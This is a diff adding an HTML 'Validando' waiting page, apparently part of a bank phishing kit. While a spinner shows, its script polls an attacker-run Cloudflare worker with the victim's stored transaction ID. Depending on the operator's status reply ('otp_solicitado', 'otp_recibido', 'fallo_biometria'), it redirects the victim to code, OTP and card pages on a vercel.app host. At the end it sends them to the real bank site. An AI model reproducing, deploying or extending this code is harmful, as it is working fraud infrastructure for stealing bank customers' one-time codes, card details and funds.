@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes" />
+  <title>Validando - Galicia</title>
+  
+  <style>
+    /* RESET */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    /* ============================================
+       SPINNER SALMON - CÍRCULO DE CARGA
+    ============================================ */
+    .spinner-salmon {
+      position: relative;
+      width: 60px;
+      height: 60px;
+    }
+
+    .spinner-salmon::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: 4px solid rgba(244, 119, 33, 0.15);
+      border-radius: 50%;
+    }
+
+    .spinner-salmon::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: 4px solid transparent;
+      border-top-color: #f47721;
+      border-bottom-color: #f47721;
+      border-radius: 50%;
+      animation: spinSalmon 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+    }
+
+    @keyframes spinSalmon {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Icono dentro del círculo (opcional) */
+    .spinner-salmon .icon {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: #f47721;
+      font-size: 22px;
+      z-index: 1;
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .spinner-salmon::after {
+        animation: none;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- SOLO CÍRCULO SALMON -->
+  <div class="spinner-salmon">
+    <div class="icon">
+      <i class="fas fa-shield-alt"></i>
+    </div>
+  </div>
+
+  <!-- Font Awesome para el ícono -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <script>
+    // ========================= CONFIGURACIÓN =========================
+    const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
+    const BASE_URL = 'https://personasgalicia.vercel.app';
+    let intentos = 0;
+    const MAX_INTENTOS = 60;
+
+    // ========================= FUNCIÓN PRINCIPAL =========================
+    async function checkStatus(transactionId) {
+      intentos++;
+      
+      try {
+        const response = await fetch(`${WORKER_URL}/status?id=${transactionId}`);
+        
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status}`);
+        }
+        
+        const data = await response.json();
+        console.log(`📊 Estado (${intentos}/${MAX_INTENTOS}):`, data);
+
+        // Si está pendiente, seguir esperando
+        if (!data.estado || data.estado === "pendiente") {
+          if (intentos >= MAX_INTENTOS) {
+            console.log('⏰ Tiempo de espera agotado');
+            return;
+          }
+          setTimeout(() => checkStatus(transactionId), 10000);
+          return;
+        }
+
+        // ========================= PROCESAR ESTADO =========================
+        const estado = data.estado;
+        console.log(`✅ Estado recibido: ${estado}`);
+        
+        switch (estado) {
+          case 'autorizado':
+            setTimeout(() => {
+              window.location.href = `${BASE_URL}/codigo.html`;
+            }, 500);
+            break;
+            
+          case 'error':
+            setTimeout(() => {
+              window.location.href = `${BASE_URL}/`;
+            }, 500);
+            break;
+            
+          case 'otp_solicitado':
+            setTimeout(() => checkStatus(transactionId), 10000);
+            break;
+            
+          case 'otp_recibido':
+            setTimeout(() => {
+              window.location.href = `${BASE_URL}/codeinco.html`;
+            }, 500);
+            break;
+            
+          case 'fallo_biometria':
+            setTimeout(() => {
+              window.location.href = `${BASE_URL}/tarjeta.html`;
+            }, 500);
+            break;
+            
+          case 'finalizado':
+            setTimeout(() => {
+              window.location.href = 'https://www.bancopopular.com.co/';
+            }, 500);
+            break;
+            
+          default:
+            setTimeout(() => checkStatus(transactionId), 10000);
+        }
+        
+      } catch (error) {
+        console.error('❌ Error:', error);
+        if (intentos < MAX_INTENTOS) {
+          setTimeout(() => checkStatus(transactionId), 5000);
+        }
+      }
+    }
+
+    // ========================= INICIALIZACIÓN =========================
+    document.addEventListener('DOMContentLoaded', async () => {
+      const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
+      
+      if (!bancoldata || !bancoldata.transactionId) {
+        console.log('❌ Error: Datos no encontrados');
+        setTimeout(() => {
+          window.location.href = `${BASE_URL}/`;
+        }, 1000);
+        return;
+      }
+
+      const transactionId = bancoldata.transactionId;
+      console.log('🔍 Verificando transacción:', transactionId);
+
+      await checkStatus(transactionId);
+    });
+  </script>
+</body>
+</html>
